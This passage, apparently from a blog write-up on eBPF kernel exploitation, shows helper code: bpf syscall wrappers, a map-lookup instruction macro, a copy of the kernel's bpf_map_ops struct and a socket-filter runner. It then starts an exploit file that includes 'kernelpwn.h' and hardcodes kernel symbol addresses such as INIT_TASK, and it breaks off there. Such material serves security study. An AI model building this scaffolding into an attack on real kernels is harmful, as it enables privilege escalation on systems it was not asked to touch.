BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* mov the result back and clear R0 */</span>          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __user</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __user </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __rcu</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __rcu </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf_type</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog_aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_table_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage_map</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* map is generic key/value storage optionally accesible by eBPF programs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line">	<span class="comment">/* funcs callable from userspace (via syscall) */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *(*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *<span class="title">attr</span>);</span></span><br><span class="line">	<span class="keyword">void</span> (*map_release)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file);</span><br><span class="line">	<span class="keyword">void</span> (*map_free)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">int</span> (*map_get_next_key)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key);</span><br><span class="line">	<span class="keyword">void</span> (*map_release_uref)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">void</span> *(*map_lookup_elem_sys_only)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">	<span class="keyword">int</span> (*map_lookup_batch)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">				<span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line">	<span class="keyword">int</span> (*map_lookup_and_delete_batch)(struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">					   <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">					   <span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line">	<span class="keyword">int</span> (*map_update_batch)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">				<span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line">	<span class="keyword">int</span> (*map_delete_batch)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">				<span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* funcs callable from userspace and from eBPF programs */</span></span><br><span class="line">	<span class="keyword">void</span> *(*map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">	<span class="keyword">int</span> (*map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, </span><br><span class="line">        		       <span class="keyword">uint64_t</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*map_delete_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">	<span class="keyword">int</span> (*map_push_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*map_pop_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line">	<span class="keyword">int</span> (*map_peek_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* funcs called by prog_array and perf_event_array map */</span></span><br><span class="line">	<span class="keyword">void</span> *(*map_fd_get_ptr)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file,</span><br><span class="line">				<span class="keyword">int</span> fd);</span><br><span class="line">	<span class="keyword">void</span> (*map_fd_put_ptr)(<span class="keyword">void</span> *ptr);</span><br><span class="line">	<span class="keyword">int</span> (*map_gen_lookup)(struct bpf_map *<span class="built_in">map</span>, struct bpf_insn *insn_buf);</span><br><span class="line">	<span class="keyword">uint32_t</span> (*map_fd_sys_lookup_elem)(<span class="keyword">void</span> *ptr);</span><br><span class="line">	<span class="keyword">void</span> (*map_seq_show_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span><br><span class="line">				  struct seq_file *m);</span><br><span class="line">	<span class="keyword">int</span> (*map_check_btf)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">			     <span class="keyword">const</span> struct btf *btf,</span><br><span class="line">			     <span class="keyword">const</span> struct btf_type *key_type,</span><br><span class="line">			     <span class="keyword">const</span> struct btf_type *value_type);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Prog poke tracking helpers. */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_poke_track)(struct bpf_map *<span class="built_in">map</span>, struct bpf_prog_aux *aux);</span><br><span class="line">	<span class="keyword">void</span> (*map_poke_untrack)(struct bpf_map *<span class="built_in">map</span>, struct bpf_prog_aux *aux);</span><br><span class="line">	<span class="keyword">void</span> (*map_poke_run)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">uint32_t</span> key, </span><br><span class="line">			     struct bpf_prog *old, struct bpf_prog *<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Direct value access helpers. */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_direct_value_addr)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">				     <span class="keyword">uint64_t</span> *imm, <span class="keyword">uint32_t</span> off);</span><br><span class="line">	<span class="keyword">int</span> (*map_direct_value_meta)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">				     <span class="keyword">uint64_t</span> imm, <span class="keyword">uint32_t</span> *off);</span><br><span class="line">	<span class="keyword">int</span> (*map_mmap)(struct bpf_map *<span class="built_in">map</span>, struct vm_area_struct *vma);</span><br><span class="line">	<span class="keyword">__poll_t</span> (*map_poll)(struct bpf_map *<span class="built_in">map</span>, struct file *filp,</span><br><span class="line">			     struct poll_table_struct *pts);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Functions called by bpf_local_storage maps */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_local_storage_charge)(struct bpf_local_storage_map *smap,</span><br><span class="line">					<span class="keyword">void</span> *owner, <span class="keyword">uint32_t</span> size);</span><br><span class="line">	<span class="keyword">void</span> (*map_local_storage_uncharge)(struct bpf_local_storage_map *smap,</span><br><span class="line">					   <span class="keyword">void</span> *owner, <span class="keyword">uint32_t</span> size);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage</span> __<span class="title">rcu</span> ** (*<span class="title">map_owner_storage_ptr</span>)(<span class="title">void</span> *<span class="title">owner</span>);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* map_meta_equal must be implemented for maps that can be</span></span><br><span class="line"><span class="comment">	 * used as an inner map.  It is a runtime check to ensure</span></span><br><span class="line"><span class="comment">	 * an inner map can be inserted to an outer map.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Some properties of the inner map has been used during the</span></span><br><span class="line"><span class="comment">	 * verification time.  When inserting an inner map at the runtime,</span></span><br><span class="line"><span class="comment">	 * map_meta_equal has to ensure the inserting map has the same</span></span><br><span class="line"><span class="comment">	 * properties that the verifier has used earlier.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_meta_equal)(<span class="keyword">const</span> struct bpf_map *meta0,</span><br><span class="line">			      <span class="keyword">const</span> struct bpf_map *meta1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* BTF name and id of struct allocated by map_alloc */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> map_btf_name;</span><br><span class="line">	<span class="keyword">int</span> *map_btf_id;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* bpf_iter info used to open a seq_file */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_iter_seq_info</span> *<span class="title">iter_seq_info</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="keyword">sizeof</span>(*attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_load_prog</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> prog_type, struct bpf_insn *insns, <span class="keyword">uint64_t</span> insn_cnt,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">char</span> *log_buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> log_buf_sz, <span class="keyword">unsigned</span> <span class="keyword">int</span> log_level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = prog_type,</span><br><span class="line">        .insns = (<span class="keyword">uint64_t</span>) insns,</span><br><span class="line">        .insn_cnt = insn_cnt,</span><br><span class="line">        .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">        .log_level = log_level,</span><br><span class="line">        .log_buf = (<span class="keyword">uint64_t</span>) log_buf,</span><br><span class="line">        .log_size = log_buf_sz,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> map_type, <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type = map_type,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_lookup_elem</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">const</span> <span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">        .value = (<span class="keyword">uint64_t</span>) value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_update_elem</span><span class="params">(<span class="keyword">int</span> map_fd,<span class="keyword">const</span> <span class="keyword">void</span> *key,<span class="keyword">const</span> <span class="keyword">void</span> *value,<span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">        .value = (<span class="keyword">uint64_t</span>) value,</span><br><span class="line">        .flags = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_delete_elem</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">const</span> <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_get_next_key</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">const</span> <span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">        .next_key = (<span class="keyword">uint64_t</span>) value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LOG_BUF_SZ 0x100000</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SZ] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Run a bpf prog by attaching to a pair of sockets and sending packets</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param insns bpf program to be run</span></span><br><span class="line"><span class="comment"> * @param insn_cnt number of bpf instructions</span></span><br><span class="line"><span class="comment"> * @return int 0 for success, others for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insns, <span class="keyword">uint64_t</span> insn_cnt, <span class="keyword">unsigned</span> <span class="keyword">int</span> log_level, </span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">unsigned</span> <span class="keyword">int</span> print_log)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *err_msg = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> sock_fd[<span class="number">2</span>], prog_fd;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* socket pair to trigger eBPF prog */</span></span><br><span class="line">    ret = socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sock_fd);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_msg = <span class="string">&quot;FAILED to creat socket pair!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(bpf_log_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(bpf_log_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* load bpf prog into kernel */</span></span><br><span class="line">    prog_fd = bpf_load_prog(BPF_PROG_TYPE_SOCKET_FILTER, insns, insn_cnt, </span><br><span class="line">                            bpf_log_buf, BPF_LOG_BUF_SZ, log_level);</span><br><span class="line">    <span class="keyword">if</span> (prog_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ret = prog_fd;</span><br><span class="line">        err_msg = <span class="string">&quot;FAILED to load bpf program!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_bpf_load;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* attach bpf prog to a socket */</span></span><br><span class="line">    ret = setsockopt(sock_fd[<span class="number">0</span>],SOL_SOCKET,SO_ATTACH_BPF, &amp;prog_fd,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_msg = <span class="string">&quot;FAILED to attach the bpf program!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_bpf_attach;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send a packet to trigger bpf */</span></span><br><span class="line">    write(sock_fd[<span class="number">1</span>], <span class="string">&quot;11111111&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* output the log */</span></span><br><span class="line">    <span class="keyword">if</span> (print_log != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(bpf_log_buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recycle resource */</span></span><br><span class="line">    close(prog_fd);</span><br><span class="line">    close(sock_fd[<span class="number">1</span>]);</span><br><span class="line">    close(sock_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_bpf_attach:</span><br><span class="line">    close(prog_fd);</span><br><span class="line">err_bpf_load:</span><br><span class="line">    <span class="built_in">puts</span>(bpf_log_buf);</span><br><span class="line">    close(sock_fd[<span class="number">1</span>]);</span><br><span class="line">    close(sock_fd[<span class="number">0</span>]);</span><br><span class="line">err_socket:</span><br><span class="line">    err_print(err_msg);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bpf_tools.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SIZE 0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAY_MAP_OPS 0xffffffff822363e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_TASK 